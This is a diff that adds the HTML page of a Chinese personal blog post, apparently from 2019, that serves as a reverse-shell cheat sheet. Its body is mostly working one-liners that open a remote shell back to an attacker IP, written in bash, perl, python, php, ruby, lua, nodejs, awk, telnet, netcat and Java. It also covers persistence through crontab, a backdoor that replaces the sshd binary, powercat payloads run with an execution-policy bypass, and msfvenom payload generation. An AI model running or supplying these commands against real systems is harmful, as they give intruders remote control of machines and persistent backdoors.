@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="反弹shell,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="一、参考文章参考链接： 你和目标只差一个shell的距离  Pentest Monkey-关于反向shell的cheatsheet 如何将简单的Shell转换成为完全交互式的TTY 二、Linux下反弹shell利用perl的socket1perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOC">
+<meta name="keywords" content="反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="https://jeremyekek.github.io/2019/06/01/反弹shell/index.html">
+<meta property="og:site_name" content="EkEk的个人博客">
+<meta property="og:description" content="一、参考文章参考链接： 你和目标只差一个shell的距离  Pentest Monkey-关于反向shell的cheatsheet 如何将简单的Shell转换成为完全交互式的TTY 二、Linux下反弹shell利用perl的socket1perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOC">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/06/01/反弹shell/1556788641854.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/06/01/反弹shell/1556788801376.png">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/06/01/反弹shell/1556788895224.png">
+<meta property="og:updated_time" content="2019-06-24T13:24:37.546Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="反弹shell">
+<meta name="twitter:description" content="一、参考文章参考链接： 你和目标只差一个shell的距离  Pentest Monkey-关于反向shell的cheatsheet 如何将简单的Shell转换成为完全交互式的TTY 二、Linux下反弹shell利用perl的socket1perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOC">
+<meta name="twitter:image" content="https://jeremyekek.github.io/2019/06/01/反弹shell/1556788641854.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"post","offset":20,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jeremyekek.github.io/2019/06/01/反弹shell/">
+
+
+
+
+
+  <title>反弹shell | EkEk的个人博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">EkEk的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/06/01/反弹shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="EkEk">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="EkEk的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反弹shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-06-24T21:24:37+08:00">
+                2019-06-24
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/06/01/反弹shell/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/06/01/反弹shell/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="一、参考文章"><a href="#一、参考文章" class="headerlink" title="一、参考文章"></a>一、参考文章</h1><p><strong>参考链接</strong>：</p>
+<p><a href="https://klionsec.github.io/2016/09/27/revese-shell/" target="_blank" rel="noopener">你和目标只差一个shell的距离</a> </p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">Pentest Monkey-关于反向shell的cheatsheet</a></p>
+<p><a href="https://www.sohu.com/a/161766202_709042" target="_blank" rel="noopener">如何将简单的Shell转换成为完全交互式的TTY</a></p>
+<h1 id="二、Linux下反弹shell"><a href="#二、Linux下反弹shell" class="headerlink" title="二、Linux下反弹shell"></a>二、Linux下反弹shell</h1><h2 id="利用perl的socket"><a href="#利用perl的socket" class="headerlink" title="利用perl的socket"></a>利用perl的socket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.1.128&quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="利用系统特殊设备文件"><a href="#利用系统特殊设备文件" class="headerlink" title="利用系统特殊设备文件"></a>利用系统特殊设备文件</h2><p>就是把bash的数据全部通多/dev/tcp建立的socket发过去,以此来达到反弹shell的效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.128/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h2 id="利用sshd"><a href="#利用sshd" class="headerlink" title="利用sshd"></a>利用sshd</h2><blockquote>
+<p>注意：正向连接，有防火墙阻隔</p>
+</blockquote>
+<p>第一种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//服务端开启端口服务</span><br><span class="line">netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;</span><br><span class="line">netstat -tulnp | grep &quot;8080&quot;</span><br><span class="line"></span><br><span class="line">//把sshd绑定在本地的8080端口，从8080端口进来就相当于本机的sshd端口</span><br><span class="line">ln -f	//把原有的数据清空</span><br><span class="line">-o		//去掉第一次ssh连接的那个密钥对提示</span><br><span class="line"></span><br><span class="line">//客户端连接</span><br><span class="line">ssh root@192.168.1.129 -p 8080      一定要注意在自己本地机器上用这个端口去连</span><br><span class="line">pkill su</span><br></pre></td></tr></table></figure>
+<p>第二种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin/</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.1.129:22,sourceport=13377</span><br></pre></td></tr></table></figure>
+<h2 id="普通nc反弹"><a href="#普通nc反弹" class="headerlink" title="普通nc反弹"></a>普通nc反弹</h2><p>利用最古老的nc来反弹,但默认正常发行版中默认带的那个nc都是阉割版的,即没有-e选项,也就意味着不能直接用它反弹shell,好在强大的linux为我们提供了一个建立管道的工具mkfifo和bash本身的各种管道特性,我们就可以利这种方式,把bash的数据通过管道反弹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.1.128 8080 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<h2 id="完全版nc反弹"><a href="#完全版nc反弹" class="headerlink" title="完全版nc反弹"></a>完全版nc反弹</h2><p>正向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 8989 -e /bin/bash	//服务端开启监听</span><br><span class="line">nc -vv 192.168.10.10 8989	//客户端建立连接</span><br></pre></td></tr></table></figure>
+<p>反向</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8989</span><br><span class="line">nc -e /bin/bash 10.0.3.4 8989</span><br></pre></td></tr></table></figure>
+<h2 id="加密nc反弹"><a href="#加密nc反弹" class="headerlink" title="加密nc反弹"></a>加密nc反弹</h2><p>加密版的netcat = ‘cryptcat’,可以设置连接密码,用-k指定下即可,kali默认自带,如果是目标机器,可能需要你自己手工动装一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cryptcat -vv -l -p 25 -k sec</span><br><span class="line">cryptcat -vv -l -p 80 -k sec</span><br><span class="line">cryptcat 192.168.12.141 80 -k sec|cmd.exe|cryptcat 192.168.12.141 25 -k sec</span><br></pre></td></tr></table></figure>
+<h2 id="利用awk-gawk"><a href="#利用awk-gawk" class="headerlink" title="利用awk/gawk"></a>利用awk/gawk</h2><p>awk就不用多说了吧,linux文本处理三剑客的老大,语句的意思也非常简单,就是循环发socket</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="利用telent客户端"><a href="#利用telent客户端" class="headerlink" title="利用telent客户端"></a>利用telent客户端</h2><p>利用系统自带的telnet客户端来反弹shell,一般运维默认都会把它装上</p>
+<p>第一种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 1080   //命令结果显示窗口</span><br><span class="line">nc -lvp 8080   //命令传输窗口</span><br><span class="line"></span><br><span class="line">telnet 192.168.1.127 8080 | /bin/bash | telnet 192.168.1.128 1080</span><br></pre></td></tr></table></figure>
+<p>第二种：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">mknod test p &amp;&amp; telnet 192.168.1.128 8080 0&lt;test | /bin/bash 1&gt;test</span><br></pre></td></tr></table></figure>
+<h2 id="利用python"><a href="#利用python" class="headerlink" title="利用python"></a>利用python</h2><p>就像perl在绝大多数发行版上都已经自带,但默认是2.6.6</p>
+<p>这里用最简单的方法，py的socket来反弹一个shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.128&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+<p>还有高级的用法py reverse_shell</p>
+<h2 id="利用crontab定时反弹"><a href="#利用crontab定时反弹" class="headerlink" title="利用crontab定时反弹"></a>利用crontab定时反弹</h2><p>很容被发现,临时用用还行,至于用什么反弹,随意,perl,py都行,你喜欢,用完以后记得立马删掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;* * * * *  /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.1.128\&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot;)|crontab -</span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
+<h2 id="利用php的socket"><a href="#利用php的socket" class="headerlink" title="利用php的socket"></a>利用php的socket</h2><p>对于php的网站,也许我们可以利用上,也是很多php大马里默认的反弹方式,当然,除了php脚本,别的web后端脚本其实都可以被利用,比如,jsp…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">/usr/local/php/bin/php -r &apos;$sock=fsockopen(&quot;192.168.1.128&quot;,8080);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="利用java"><a href="#利用java" class="headerlink" title="利用java"></a>利用java</h2><p>如果目标机器上有java环境,那就更好了,直接用java来弹,效果一般还是非常好的,而且java的免杀效果也很不错哦,把下面的代码打成jar包就可以了,记得打之前改下里面要反弹到的ip和端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">public class Revs &#123;</span><br><span class="line">    /**</span><br><span class="line">    * @param args</span><br><span class="line">    * @throws Exception </span><br><span class="line">    */</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // TODO Auto-generated method stub</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.1.128/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="利用ruby的socket"><a href="#利用ruby的socket" class="headerlink" title="利用ruby的socket"></a>利用ruby的socket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;192.168.1.128&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="利用lua的socket"><a href="#利用lua的socket" class="headerlink" title="利用lua的socket"></a>利用lua的socket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">apt-get install lua50 -y</span><br><span class="line">apt-get install luarocks -y</span><br><span class="line">luarocks install luasocket</span><br><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.1.128&apos;,&apos;8080&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="利用nodejs"><a href="#利用nodejs" class="headerlink" title="利用nodejs"></a>利用nodejs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">    cp = require(&quot;child_process&quot;),</span><br><span class="line">    sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;10.17.26.64&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+<h2 id="利用c版的reverse-shell"><a href="#利用c版的reverse-shell" class="headerlink" title="利用c版的reverse_shell"></a>利用c版的reverse_shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080</span><br><span class="line"></span><br><span class="line">gcc c_revese_shell.c -o cshell</span><br><span class="line">./cshell 192.168.1.128 8080</span><br></pre></td></tr></table></figure>
+<h2 id="利用gcc反弹shell"><a href="#利用gcc反弹shell" class="headerlink" title="利用gcc反弹shell"></a>利用gcc反弹shell</h2><p>待补充</p>
+<h1 id="三、基于不同协议下的shell反弹方式"><a href="#三、基于不同协议下的shell反弹方式" class="headerlink" title="三、基于不同协议下的shell反弹方式"></a>三、基于不同协议下的shell反弹方式</h1><h2 id="利用icmp"><a href="#利用icmp" class="headerlink" title="利用icmp"></a>利用icmp</h2><p>需要你自己先编译下,会生成两个文件,一个服务端[ishd]一个客户端[ish],自己有兴趣可以拿wireshark看下,通常用来穿透高层防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make linux</span><br><span class="line">./ishd -i 6555 -t 0 -p 8080</span><br><span class="line">./ish -i 6555 -t 0 -p 8080 192.168.1.129[这里的ip可以换成域名]</span><br></pre></td></tr></table></figure>
+<h2 id="利用udp"><a href="#利用udp" class="headerlink" title="利用udp"></a>利用udp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 53 -u     //注意这里务必要用udp的模式来接</span><br><span class="line">python udpshell.py 192.168.1.128 53 udp</span><br></pre></td></tr></table></figure>
+<h2 id="利用dns"><a href="#利用dns" class="headerlink" title="利用dns"></a>利用dns</h2><p>详情可自行参考cobalt strike,那可能是现今最好的dns隧道学习样例</p>
+<h1 id="四、win平台反弹shell"><a href="#四、win平台反弹shell" class="headerlink" title="四、win平台反弹shell"></a>四、win平台反弹shell</h1><h2 id="利用powershell"><a href="#利用powershell" class="headerlink" title="利用powershell"></a>利用powershell</h2><p>除了上面那些可以通用的语言反弹shell之外,win下最重要应该是powershell了</p>
+<blockquote>
+<p>注意：vbs只在03以下的系统</p>
+</blockquote>
+<p>利用powercat来反弹shell,其实就是powershell版的netcat</p>
+<p>首先,在本机创建好powershell版的reverse shell的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ExecutionPolicy Unrestricted</span><br><span class="line">PS C:\&gt; cd .\powercat</span><br><span class="line">PS C:\powercat&gt; Import-Module .\powercat.ps1</span><br><span class="line">PS C:\powercat&gt; powercat -c 192.168.1.128 -p 8080 -e cmd -g &gt;&gt; payload.ps1</span><br><span class="line">C:\&gt;nc -lvp 8080</span><br></pre></td></tr></table></figure>
+<p>然后,把payload.ps1丢到目标机器上去执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\payload.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="利用nishang"><a href="#利用nishang" class="headerlink" title="利用nishang"></a>利用nishang</h2><p>待补充</p>
+<h1 id="五、Metasploit的msfvenom"><a href="#五、Metasploit的msfvenom" class="headerlink" title="五、Metasploit的msfvenom"></a>五、Metasploit的msfvenom</h1><p>Metasploit在“cmd/unix”下，有几个可用于生成单行绑定或反向shell的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &quot;cmd/unix&quot;|awk &apos;&#123;print $1&#125;&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/01/反弹shell/1556788641854.png" alt="1556788641854"></p>
+<p>以上显示的所有payload都可以和msfvenom一起使用，并且我们可以根据自身需求指定LHOST，LPORT或RPORT。</p>
+<p>例如，这里是一个不需要-e标志的netcat命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat 192.168.11.11 LPORT=3430 R</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/01/反弹shell/1556788801376.png" alt="1556788801376"></p>
+<p>如果没有安装netcat，我们还可以生成一个Perl的反向shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl RHOST=192.168.11.11 LPORT=3430 R</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/06/01/反弹shell/1556788895224.png" alt="1556788895224"></p>
+<p>这些都可以通过使用netcat，并侦听指定的端口（4444）来捕获。</p>
+<h1 id="六、简单Shell转换交互式TTY"><a href="#六、简单Shell转换交互式TTY" class="headerlink" title="六、简单Shell转换交互式TTY"></a>六、简单Shell转换交互式TTY</h1><h2 id="利用Python的pty"><a href="#利用Python的pty" class="headerlink" title="利用Python的pty"></a>利用Python的pty</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;	//这里注意引号</span><br></pre></td></tr></table></figure>
+<p>使用Metasploit的msfvenom一行生成命令</p>
+<h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><p>反弹的核心就是和目标系统建立socket，如果中间（正向和反向）端口被防火墙阻断,可能就只能选择复用或者直接走更底层的协议；</p>
+<p>shell的方法很多，怎么在实战中按照的需求改进，才是更需要思考的；</p>
+<p>反弹的时候，进程会一直处于挂起状态，通过放至后台进程保持连接。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/反弹shell/" rel="tag"># 反弹shell</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/" rel="next" title="zabbix-SQL注入-getshell-CVE-2016-10134">
+                <i class="fa fa-chevron-left"></i> zabbix-SQL注入-getshell-CVE-2016-10134
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/15/Wireshark入门分析/" rel="prev" title="wireshark入门分析">
+                wireshark入门分析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
